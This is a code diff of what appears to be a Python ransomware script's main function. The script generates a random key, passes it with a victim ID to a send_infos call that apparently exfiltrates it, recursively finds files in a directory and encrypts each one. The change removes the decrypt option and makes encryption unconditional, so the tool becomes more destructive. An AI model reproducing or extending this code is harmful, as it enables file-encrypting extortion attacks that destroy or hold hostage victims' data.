@@ -16,7 +16,7 @@ def get_time():
 
     return today
     
-def generate_random_string(length=32):
+def generate_random_string(length=16):
     letters = string.ascii_lowercase
     random_string = ''.join(random.choice(letters) for i in range(length))
     return random_string
@@ -34,14 +34,15 @@ def main():
     encrypt = args.encrypt
     decrypt = args.decrypt
     verbose = args.verbose
-
+    
     target_id = generate_random_string(12)
     infos = create_infos.CreateInfos(target_id)
+    
+    key = generate_random_string()
 
-    target_key = generate_random_string()
-    infos.send_infos(target_key)
+    infos.send_infos(key)
 
-    encrypt = encryption.EncryptionData(target_key)
+    encrypt = encryption.EncryptionData(key)
     files = search_files.SearchDirThree(directory)
     all_files = files.search_all_files()
     
@@ -52,12 +53,8 @@ def main():
         if verbose:
             info.log(file)
         
-        if encrypt:
-            encrypt.encrypt(file)
+        encrypt.encrypt(file)
         
-        elif decrypt:
-            encrypt.decrypt(file)
-
     info.log("Stopped in: {0}".format(get_time()))
 
 if __name__=='__main__':
